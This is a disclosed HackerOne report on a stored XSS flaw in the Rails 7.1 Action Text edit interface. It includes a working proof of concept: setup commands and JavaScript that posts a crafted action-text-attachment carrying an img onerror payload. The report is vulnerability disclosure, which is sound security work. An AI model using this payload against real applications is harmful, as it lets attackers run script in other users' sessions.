# Action Text XSS (Rails 7.1.x)

## Report Details
- **Report ID**: 2389565
- **URL**: https://hackerone.com/reports/2389565
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-02-25T13:50:14.371Z
- **Disclosed**: 2025-02-04T05:47:29.433Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
I have confirmed that XSS occurs on the Action Text edit ui.
XSS is triggered when attempting to edit the text in which the crafted values are stored.

### PoC

Prepare the environment.

```
❯ rails new -C  -G -T text
# => Rails 7.1.3.2, Ruby 3.2.3

❯ cd text

❯ bin/rails g scaffold Blog title:string body:rich_text

❯ bin/rails action_text:install

❯ bundle install

❯ bin/rails db:migrate

❯ bin/rails s
```

Open `http://localhost:3000/blogs/new`  and send the following from the developer tools

```js
function escapeHTML(str) {
    var div = document.createElement('div');
    div.appendChild(document.createTextNode(str));
    return div.innerHTML;
}

html = "<img src=. onerror='alert(location)' />"
html_text = '<action-text-attachment content-type="text/html" content="'+ escapeHTML (html) +'"></action-text-attachment>'

csrfToken = document.querySelector("meta[name='csrf-token']").content

fetch("http://localhost:3000/blogs", {
  "headers": {
  	"content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    "x-csrf-token": csrfToken,
  },
  "body": "blog%5Btitle%5D=aaa&blog%5Bbody%5D=" +encodeURIComponent(html_text)+ "&commit=Create+Blog",
  "method": "POST",
});
```

Can confirm that XSS does not fire on the `http://localhost:3000/blogs/xxx/show` page, 

{F3079164}

but XSS does occur on the `http://localhost:3000/blogs/xxx/edit` page. 

{F3079167}

## Impact

If multiple users have access to the same edit page, an XSS-based attack is possible between users.

This vulnerability is probably due to https://github.com/rails/rails/pull/45739 PR and was not reproduced in Rails 7.0.

## Attachments
- 7_1_show.png
- 7_1_edit.png
